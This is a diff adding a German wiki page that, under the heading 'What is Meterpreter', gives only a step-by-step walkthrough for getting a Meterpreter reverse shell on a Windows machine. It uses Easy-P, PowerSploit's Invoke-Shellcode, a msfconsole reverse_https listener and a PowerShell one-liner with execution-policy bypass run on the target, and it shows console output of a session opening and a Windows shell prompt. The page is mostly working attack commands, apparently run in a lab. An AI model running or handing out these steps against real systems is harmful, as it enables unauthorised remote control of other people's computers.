@@ -1,0 +1,72 @@
+====== Was ist der Meterpreter ======
+ 
+===== Beispiele =====
+
+Ein mögliches Beispiel mit PowerShell und Easy-P und der msfconsole. 
+
+Easy-P kann über git heruntergeladen werden. 
+
+[[https://github.com/cheetz/Easy-P]]
+ 
+Der Start erfolgt über Python 
+<code bash>
+python easy_p.py
+</code>
+
+In meinen Fall möchte ich ein PowerShell Meterpreter erstellen. Press 4 
+
+Auf der folgenden Webseite kann der Orginal PowerShell Meterpreter gedownloadet werden [[https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1]] 
+
+
+Als nächstes wird die der LHOST als localhost angebenden und der LPORT 
+
+<code bash>
+LHOST: 192.168.50.105
+LPORT: 4444
+</code>
+
+ In der msfconsole muss folgendes eingegeben werden.
+
+<code bash>
+msfconsole -r listener.rc
+use multi/handler 
+set payload windows/meterpreter/reverse_https 
+set LHOST 192.168.50.105
+set LPORT 4444
+set ExitOnSession false 
+exploit -j
+</code>
+
+Auf dem Zielclient muss folgendes Eingeben werden.
+
+<code powershell>
+powershell.exe -exec bypass -Command "& {Import-Module .\Invoke-Shellcode.ps1; Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.50.105 -Lport 4444 -Force}"
+</code>
+
+Danach kann man auf die session 1 zugreifen .
+
+<konsole>
+[*] Exploit running as background job.
+
+[*] Started HTTPS reverse handler on https://0.0.0.0:4444/
+msf exploit(handler) > [*] Starting the payload handler...
+[*] 192.168.50.102:53495 (UUID: 8ce59193af0afda2/x86=1/windows=1/2015-11-02T19:15:48Z) Staging Native payload ...
+[*] Meterpreter session 1 opened (192.168.50.105:4444 -> 192.168.50.102:53495) at 2015-11-02 20:15:49 +0100
+</konsole>
+
+Mit dem Kommando session kann man auf den Zielclient zugreifen.
+
+<konsole>
+msf exploit(handler) > sessions -i 1
+[*] Starting interaction with 1...
+meterpreter > shell
+Process 1120 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.10240]
+(c) 2015 Microsoft Corporation. Alle Rechte vorbehalten.
+C:\temp>
+</konsole>
+ 
+
+
+
